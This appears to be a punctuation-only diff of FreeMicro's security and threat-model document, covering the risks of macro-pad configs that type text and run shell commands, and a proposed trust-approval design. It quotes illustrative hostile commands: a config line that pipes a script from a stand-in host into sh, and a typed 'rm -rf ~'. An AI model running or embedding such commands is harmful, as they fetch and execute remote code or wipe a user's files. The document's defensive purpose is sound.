@@ -3,7 +3,7 @@
 > Read this before you run someone else's pad config.
 
 FreeMicro types into whatever application is focused and runs shell commands on
-your machine. That is not a side effect — it is the product. A macro pad that
+your machine. That is not a side effect - it is the product. A macro pad that
 cannot press keys and run things is a paperweight, which is exactly the problem
 this project set out to fix.
 
@@ -32,20 +32,20 @@ how much damage it can do.
 | Kind | What it does | Worst case |
 |---|---|---|
 | `shell` | Runs a command through `/bin/sh -c` | **Arbitrary code execution as you.** Reads, writes and deletes anything you can; opens network connections; installs things |
-| `applescript` | Runs an arbitrary AppleScript via `osascript` | **Arbitrary code execution as you**, plus scripted control of any app that exposes an AppleScript dictionary — Mail, Messages, Finder, browsers |
+| `applescript` | Runs an arbitrary AppleScript via `osascript` | **Arbitrary code execution as you**, plus scripted control of any app that exposes an AppleScript dictionary - Mail, Messages, Finder, browsers |
 | `app` | Activates an application by name | Launches any installed app, brings it to the front (so a later keystroke lands somewhere chosen by the config, not by you) |
 | `text` | Types literal text into the frontmost app, optionally + Return | Types anything, anywhere the cursor is. **Into a terminal, this is arbitrary code execution too** |
 | `key` | Presses a keystroke | Any shortcut in any app: quit, close without saving, send, delete |
 | `hold` | Holds a key down while the pad key is held | Same as `key` |
 | `mouse` | Moves the pointer and clicks | Clicks through confirmation dialogs, including the ones asking whether you meant to do something destructive |
-| `none` | Nothing | — |
+| `none` | Nothing | - |
 
 Two things people get wrong about that table:
 
 **`text` is not the safe option.** `{"action": "text", "text": "curl
 https://x.invalid/i.sh | sh", "submit": true}` is a shell action wearing a
 disguise. The only thing standing between it and execution is which window
-happens to be focused — and an `app` binding on the key before it can decide
+happens to be focused - and an `app` binding on the key before it can decide
 that too.
 
 **FreeMicro cannot see where your keystrokes land.** Synthetic events go to the
@@ -57,8 +57,8 @@ permission below is granted so grudgingly by the OS.
 
 ## 2. The two macOS permissions
 
-Both are granted to **the application you run `freemicro` from** — your terminal
-— not to FreeMicro. macOS attaches these to the enclosing app bundle. This is
+Both are granted to **the application you run `freemicro` from** - your terminal
+- not to FreeMicro. macOS attaches these to the enclosing app bundle. This is
 the single most important thing in this document that is not about configs.
 
 | Permission | What FreeMicro uses it for | What it actually grants |
@@ -84,7 +84,7 @@ Verifiable by reading the source; stated here so the absence is on the record:
 - **No keylogging.** FreeMicro reads input reports from **one** HID device,
   matched by vendor and product id (`0x303A:0x8360`), on the vendor usage page.
   It never opens your keyboard, and it does not use the Accessibility grant to
-  observe input — only to synthesise it.
+  observe input - only to synthesise it.
 - **No persistence beyond what you install.** `freemicro install` edits
   `~/.claude/settings.json`; `freemicro daemon install` writes a launchd plist.
   Both are explicit commands with matching uninstall commands.
@@ -92,7 +92,7 @@ Verifiable by reading the source; stated here so the absence is on the record:
 - **No auto-update, and no code loaded from your config.** The config is data:
   JSON, parsed with `json.loads`. It is never `eval`'d, imported, or used to
   choose a Python module to load. Its *contents* are still passed to `/bin/sh`
-  when a `shell` action runs — that is the whole point of §1 — but the config
+  when a `shell` action runs - that is the whole point of §1 - but the config
   cannot extend FreeMicro itself.
 
 ---
@@ -102,11 +102,11 @@ Verifiable by reading the source; stated here so the absence is on the record:
 Assets worth protecting, in order: your shell, your files, and the credentials
 sitting in both.
 
-### 3.1 A malicious or compromised preset — *the main one*
+### 3.1 A malicious or compromised preset - *the main one*
 
 **Scenario.** You clone a repo of "great Codex Micro layouts", or paste a
 config from a gist, or a preset repo you already trusted gets a new maintainer.
-The config contains a `shell` binding on `ENC_CW` — the dial. You turn the dial
+The config contains a `shell` binding on `ENC_CW` - the dial. You turn the dial
 by accident on day three and it fires.
 
 **Why it is worse than a script you `curl | sh`.** Three reasons:
@@ -118,7 +118,7 @@ by accident on day three and it fires.
    pressed, possibly weeks later, in a context where you are not thinking about
    the config at all. There is no moment that looks like "running something".
 3. **The blast radius is the terminal's permissions**, which by this point
-   include Accessibility — so a payload can also drive the GUI.
+   include Accessibility - so a payload can also drive the GUI.
 
 **Current mitigation.** None beyond "you wrote the file". This is the gap.
 [§4](#design-preset-trust) closes it.
@@ -144,7 +144,7 @@ your pad config. Any process on the machine that can reach it can write itself a
 
 **Residual risk, stated honestly.** The token is passed as a URL parameter on
 the initial page load, so it can land in shell history and browser history. And
-a process running as *you* does not need the web UI at all — it can write
+a process running as *you* does not need the web UI at all - it can write
 `~/.freemicro/keymap.json` directly. The web UI is not the weak link; §3.4 is.
 
 **Guidance.** Run `freemicro web` when you are editing, not as a service. It has
@@ -154,7 +154,7 @@ no daemon mode for exactly this reason.
 
 **Scenario.** `freemicro daemon install` writes a launchd agent with
 `RunAtLoad` and `KeepAlive`. It starts at login, holds the pad, and runs your
-bindings — including `shell` ones — with no terminal attached and nobody
+bindings - including `shell` ones - with no terminal attached and nobody
 watching. Its `PATH` is set explicitly in the plist so shell actions can find
 ordinary tools.
 
@@ -174,7 +174,7 @@ daemon on a shared machine.
 ### 3.4 Config file tampering
 
 **Scenario.** Anything running as your user rewrites `~/.freemicro/keymap.json`
-— a malicious `npm install` postinstall script, a compromised editor extension,
+- a malicious `npm install` postinstall script, a compromised editor extension,
 a stray agent with filesystem access. Nothing about the pad looks different. The
 next key press runs their code.
 
@@ -188,7 +188,7 @@ directory with no integrity check.
 **Design mitigation.** The approved-hash store in §4 turns silent modification
 into a prompt: changed bytes mean an unknown hash, and an unknown hash with
 code-running bindings does not run them until you say so. It is a speed bump,
-not a sandbox — see [§4.9](#49-what-this-does-not-protect-against).
+not a sandbox - see [§4.9](#49-what-this-does-not-protect-against).
 
 ### 3.5 Explicitly out of scope
 
@@ -265,8 +265,8 @@ encoded.
 No canonicalisation, no re-serialisation, no key sorting. Two reasons: a
 canonical form is a parser, and parsers are where confusion attacks live; and
 re-adding a trailing newline should re-prompt, because "the file changed" is
-precisely the signal we want. The cost — reformatting your own config asks
-again, once — is the right side to err on.
+precisely the signal we want. The cost - reformatting your own config asks
+again, once - is the right side to err on.
 
 ### 4.4 The trust store
 
@@ -313,7 +313,7 @@ Bytes alone cannot tell you whether a human wrote them. So the code path that
 
 - `freemicro keys --init` and `freemicro config --edit` record `local`.
 - `freemicro preset install` and any web-UI import record the URL or source path.
-- No entry at all is treated as `unknown`, which is handled like remote — a
+- No entry at all is treated as `unknown`, which is handled like remote - a
   file that appeared without FreeMicro putting it there is exactly the §3.4
   case.
 
@@ -337,11 +337,10 @@ Rules, first match wins:
    installed; asking about it is noise. Guarded by the test in §4.2.
 2. Digest is in the trust store → `APPROVED`.
 3. No `execute` bindings **and** origin is `local` → `APPROVED`, and record the
-   digest with `approved_by: "first-use"`. This is the everyday case — you
-   edited your own keymap — and it is what keeps rule 4 meaningful.
+   digest with `approved_by: "first-use"`. This is the everyday case - you
+   edited your own keymap - and it is what keeps rule 4 meaningful.
 4. Otherwise → `NEEDS_APPROVAL`. That is: any `execute` binding, **or** any
-   config whose origin is not `local`, including a purely `input` preset —
-   because a preset that types `rm -rf ~` and Return is not safe just because it
+   config whose origin is not `local`, including a purely `input` preset - because a preset that types `rm -rf ~` and Return is not safe just because it
    used the `text` kind (§1).
 
 ### 4.7 The prompt
@@ -378,8 +377,7 @@ Approve this config?  Type yes to approve, anything else to refuse.
 Non-negotiable details:
 
 - **Every `execute` binding is printed in full.** Never truncated, never
-  scrolled off, never summarised. If there are eighty of them, print eighty —
-  the length is itself the signal.
+  scrolled off, never summarised. If there are eighty of them, print eighty - the length is itself the signal.
 - Rendered **as literal text, escaped**: a config author does not get to inject
   ANSI escapes, carriage returns or fake prompt lines into this screen. Strip
   or escape control characters before printing.
@@ -395,7 +393,7 @@ Non-negotiable details:
 | Any command with **stdin not a TTY** | **Never prompt.** Refuse, exit 2, print the `freemicro trust approve <path>` line. Approval is never read from a pipe |
 | `--trust` flag or `FREEMICRO_TRUST_CONFIG=1` | Approve without prompting, recorded as `approved_by: "flag"` so it is auditable. For scripted setup only; document it as such |
 | `freemicro daemon` (launchd) | Never prompts. Loads the config with every `execute` binding replaced by a no-op, logs one line per disabled binding plus the approve command, and keeps running. A key that does nothing is recoverable; a daemon that will not start at login is not |
-| `keys --dry-run`, `keys --list`, `config`, `doctor`, `diagnostics` | Never prompt, never gate — they cannot perform an action. Print a one-line banner: `3 bindings would run code and are not approved — freemicro trust approve` |
+| `keys --dry-run`, `keys --list`, `config`, `doctor`, `diagnostics` | Never prompt, never gate - they cannot perform an action. Print a one-line banner: `3 bindings would run code and are not approved - freemicro trust approve` |
 | Web UI `/save` | The user just authored it in a UI that already required the loopback token, so record the new digest as `approved_by: "authored"`. An **import** of an external file is not authoring: it goes through §4.7 |
 | `padconfig.parse()` / `padconfig.load()` | Unchanged. No gating in the parser (principle 6) |
 
